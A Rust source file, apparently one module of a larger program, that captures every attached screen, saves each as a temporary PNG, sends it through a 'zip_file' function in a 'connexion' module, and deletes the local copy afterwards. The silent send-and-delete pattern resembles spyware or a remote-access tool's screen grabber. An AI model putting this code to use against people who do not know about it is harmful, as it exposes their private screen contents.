use crate::connexion::zip_file;
use screenshots::Screen;
use std::path::PathBuf;
use tempfile::NamedTempFile;

pub async fn take_screenshot() {
    let screens = match Screen::all() {
        Ok(s) => s,
        Err(e) => {
            eprintln!("Erreur lors de la récupartion des écrans : {}", e);
            return;
        }
    };

    for screen in screens {
        match screen.capture() {
            Ok(image) => {
                let tmpfile = match NamedTempFile::new() {
                    Ok(f) => f,
                    Err(e) => {
                        eprintln!("Erreur création fichier temporaire : {}", e);
                        continue;
                    }
                };

                let mut png_path = PathBuf::from(tmpfile.path());
                png_path.set_extension("png");

                if let Err(e) = image.save(&png_path) {
                    eprintln!("Erreur lors de la sauvegarde de {}", e);
                    continue;
                }

                match zip_file(&png_path).await {
                    Ok(_) => {
                        println!("Image envoyée");
                        let _ = std::fs::remove_file(&png_path);
                    }
                    Err(e) => println!("Erreur lors de l'envoi {}", e),
                };
            }
            Err(e) => {
                eprintln!(
                    "Erreur lors de la capture de l'écran {} : {}",
                    screen.display_info.id, e
                );
            }
        }
    }
}
